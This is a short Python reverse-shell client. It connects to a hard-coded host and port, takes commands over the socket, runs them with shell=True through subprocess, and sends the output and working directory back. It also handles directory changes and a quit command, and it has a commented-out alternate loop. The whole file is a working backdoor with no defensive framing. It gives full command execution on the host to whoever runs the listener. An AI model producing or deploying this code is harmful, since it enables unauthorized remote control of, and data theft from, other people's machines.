import os
import socket
import subprocess
import sys

s = socket.socket()
host = '192.168.1.11'
port = 9999
s.connect((host, port))


while True:
    data = s.recv(1024) #1024 is buffer size
    if data.decode("utf-8")[:2] == 'cd':
        try:
            os.chdir(data[3:].decode("utf-8"))
            s.send('directory changed succesfully'.encode())
        except:
            s.send('error executing the command')
    elif data.decode("utf-8") == 'quit':
            sys.exit()
    elif len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)


# while True:
#     data = s.recv(1024)
#     if data.decode("utf-8") == 'quit':
#         sys.exit()
#     print(data.decode("utf-8"))
#     s.send(input('>>>').encode())


# Close Connection
s.close()
